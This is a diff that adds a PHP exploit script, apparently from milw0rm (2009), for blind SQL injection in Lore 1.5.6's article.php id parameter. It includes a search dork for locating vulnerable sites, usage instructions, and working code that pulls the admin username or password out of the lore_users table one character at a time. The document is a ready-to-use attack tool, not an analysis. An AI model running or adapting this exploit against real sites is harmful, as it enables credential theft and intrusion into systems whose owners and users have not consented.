@@ -1,0 +1,116 @@
+<?
+/* *** CURL HABILITADO ****
+Blind Sql Injections 
+Script Version : >Lore 1.5.6 
+Bug : > article.php?id=Blind ,Comentarios Habilitados * "Add Comment"
+Dork : > intext:"Powered by Lore 1.5.6"
+Coded By OzX[NuKE/US]
+HTTP://FORO.UNDERSECURITY.NET
+HTTP://FORO.EL-HACKER.COM
+Gracias C1c4tr1z,Tecn0x,Lix,1995,N0b0dy,NanonRoses,Codebreak(?),Nork,Azrael[NuKE] && Todos los Miembros de UnderSecurity.net
+100% CHILE
+
+*/
+
+set_time_limit (0); 
+function GET($url) {
+		$curl = curl_init();
+	 	$header[] = "Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5";
+		$header[] = "Cache-Control: max-age=0";
+		$header[] = "Connection: keep-alive";
+		$header[] = "Keep-Alive: 300";
+		$header[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
+		$header[] = "Accept-Language: en-us,en;q=0.5";
+		$header[] = "Pragma: "; 
+	 	curl_setopt($curl, CURLOPT_URL, $url);
+		curl_setopt($curl, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.15) Gecko/2008111317  Firefox/3.0.4');
+		curl_setopt($curl, CURLOPT_HTTPHEADER, $header);
+		curl_setopt($curl, CURLOPT_REFERER, 'http://www.google.com');
+		curl_setopt($curl, CURLOPT_ENCODING, 'gzip,deflate');
+		curl_setopt($curl, CURLOPT_AUTOREFERER, true);
+		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+		curl_setopt($curl, CURLOPT_TIMEOUT, 10);
+		if (!$html = curl_exec($curl)) { 
+		$html = file_get_contents($url);
+						 }
+		curl_close($curl);
+	return $html; 
+	}
+
+function contar($host){
+return count(explode("\n",GET($host)));
+	}
+function sql($sql,$i){ 
+return "+and+ascii(substring((".$sql."),".$i.",1))=";
+	}
+
+function genera_ansii(){
+for ($x=45;$x<=122;$x++){ //0-9 a-z && _
+	if ($x==47){ // /
+	$x++;
+	}
+	if ($x==58){
+		$x=$x+37;
+	}
+	if($x==96){//sacamos el '
+	$x++;
+	}
+
+$ansi[]=$x;
+			}
+return $ansi;
+			}
+
+$url = $argv[1]; 
+$id = $argv[2];
+$opt = $argv[3];
+
+if (count($argv)!=4){
+	echo "BLIND SQL INJECTION Lore 1.5.6 By OzX\n";
+	echo "USO :> php ".$argv[0]." url id -u [Obtener Usuario]\n";
+	echo "USO :> php ".$argv[0]."p url id -p [Obtener Password]\n";
+	echo "Ejemplo :> php ".$argv[0].".php http://www.website.com/article.php?id=009 1 -u \n";
+}else{
+
+	preg_match_all("/(comment\.php\?article_id)/", GET($url), $dat,  PREG_SET_ORDER);
+	if (!$dat){
+		echo "ERROR NO VULNERABLE | POSIBLEMENTE COMENTARIOS NO HABILITADOS\n";
+	}else{
+
+		echo "BLIND SQL INJECTION Lore 1.5.6 By OzX\n";
+		if ($opt == "-u"){
+		$var = "username";
+		}elseif($opt == "-p"){
+			$var = "password";
+		}else{
+			echo "[+] Parametros Incorrectos \n";
+			exit();
+		}
+
+		echo $var.":\n";
+		$ansi = genera_ansii(); 
+		$query = "select+".$var."+from+lore_users+where+id=".$id;
+		$original = contar($url);
+		$i=1;
+		for ($x=0;$x<=count($ansi);$x++){
+			$var = $ansi[$x];
+			$urlblind = $url.sql($query."+limit+0,1",$i).$var; 
+			$blind = contar($urlblind);
+				if ($blind == $original){
+					$name.=chr($var);
+					//system("clear"); //Linux
+					echo "  :> ".$name.chr(8);
+					$i++;
+					$x=-1;
+							}
+			echo chr($var).chr(13);
+		}
+	echo "\nResultado :> ".$name."\n";
+	}
+
+}
+
+
+?>
+
+# milw0rm.com [2009-01-28]
